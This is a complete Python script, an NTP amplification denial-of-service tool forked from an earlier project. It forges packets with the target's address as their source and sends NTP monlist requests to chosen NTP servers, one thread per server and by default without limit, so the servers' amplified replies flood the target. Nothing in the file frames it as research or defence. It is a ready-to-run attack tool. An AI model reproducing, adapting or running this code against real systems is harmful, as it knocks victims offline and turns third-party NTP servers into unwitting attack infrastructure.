#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Creator: NTP DoS
Author: K4YT3X
Date Created: October 4, 2020
Last Modified: October 4, 2020

Forked from vpnguy-zz/ntpdos

Licensed under the GNU General Public License Version 2 (GNU GPL v2),
    available at: https://www.gnu.org/licenses/gpl-2.0.txt
(C) 2020 K4YT3X
"""

# built-in imports
import argparse
import os
import random
import socket
import threading

# third-party imports
from avalon_framework import Avalon
from scapy.all import *
import netaddr

MONLIST_DATA = "\x17\x00\x03\x2a" + "\x00" * 4


def parse_arguments():
    """ parse CLI arguments
    """
    parser = argparse.ArgumentParser(
        prog="ntpdos", formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument(
        "-t", "--target", help="address of the target host", required=True
    )

    parser.add_argument(
        "-n",
        "--ntp_server",
        action="append",
        help="address of NTP servers",
        required=True,
    )

    parser.add_argument(
        "-c",
        "--count",
        type=int,
        help="number of packets to send with each of the NTP servers, infinite if unspecified"
    )

    return parser.parse_args()


def attack(ntp_server: str, target: str, count: int):
    """ start attacking the target

    Args:
        ntp_server (str): IP address of NTP server
        target (str): IP address of target host
    """
    packet = (
        IP(dst=ntp_server, src=target)
        / UDP(sport=random.randint(2000, 65535), dport=123)
        / Raw(load=MONLIST_DATA)
    )

    if count is None:
        send(packet, loop=1)
    else:
        send(packet, count=count)


# parse command line arguments
args = parse_arguments()

Avalon.info("Initializing NTP DoS script")

# check if script is started with proper privileges
if os.getuid() != 0:
    Avalon.error("This script must be run with root privileges")
    raise PermissionError("insufficient privileges")

# thread pool that holds all threads
thread_pool = []

# print information for debugging
Avalon.info(f"Target: {args.target}")
Avalon.info(f"NTP Server(s): {','.join(args.ntp_server)}")

# start one attacking thread of each of the NTP servers available
for ntp_id, ntp_server in zip(range(len(args.ntp_server)), args.ntp_server):

    # resolve NTP server hostname into IP address
    # this makes sure that the hostname/IP is valid
    try:
        ntp_server_ip = str(netaddr.IPAddress(socket.gethostbyname(ntp_server)))
    except (socket.gaierror, netaddr.core.AddrFormatError) as error:
        Avalon.error(f"Unresolvable or invalid NTP hostname: {ntp_server}")
        raise error

    thread = threading.Thread(target=attack, args=(ntp_server_ip, args.target, args.count,))
    thread.daemon = True
    thread.name = str(ntp_id)
    thread_pool.append(thread)

Avalon.info('Launching attack')
Avalon.info('Press Ctrl+C to stop the script')

# start all threads after they have been added
for thread in thread_pool:
    Avalon.debug_info(f"Starting thread {thread.name}")
    thread.start()

# sleep and wait for SystemExit and KeyboardInterrupt

try:
    for thread in thread_pool:
        thread.join()
except (SystemExit, KeyboardInterrupt):
    Avalon.warning("Exiting signal received, script exiting")
finally:
    Avalon.info("Script finished")
